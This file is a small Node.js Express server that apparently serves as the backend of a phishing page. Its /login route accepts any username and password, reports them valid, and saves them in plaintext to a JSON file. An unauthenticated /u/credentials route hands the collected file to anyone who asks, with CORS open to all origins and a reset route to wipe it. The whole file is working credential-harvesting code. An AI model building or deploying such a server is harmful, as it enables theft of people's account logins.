import express, {json} from "express";
import path from "node:path";
import fs from "node:fs";
import cors from "cors";

const PORT = process.env.PORT || 8080;
const STATIC_DIR = path.resolve("static");
const DB_FILE = path.resolve("db.json");

function createApp() {
  const server = express();
  server.use(json(), cors());
  return server;
}

const app = createApp();

app.get("/", (_, res) => {
  return res.sendFile(path.join(STATIC_DIR, "index.html"))
})

app.get("/u/credentials", (_, res) => {
  return res.sendFile(DB_FILE)
})

app.post("/u/credentials/reset", (_, res) => {
  fs.writeFileSync(DB_FILE, "[]", "utf-8");
  res.json({reset: true})
})

app.post('/login', (req, res) => {
  const payload = req.body;
  const valid = payload && payload["username"] && payload["password"];
  if (valid) saveUser(payload);
  return res.json({valid});
})

app.listen(PORT, () => {
  console.log(`server listening on localhost:${PORT}`);
})

function saveUser(credentials) {
  const db = getParsedDb();
  fs.writeFileSync(DB_FILE, JSON.stringify(db.concat(credentials), null, 2), "utf-8")
}

function getParsedDb() {
  const db = fs.readFileSync(DB_FILE).toString("utf-8");
  return db ? JSON.parse(db) : []
}
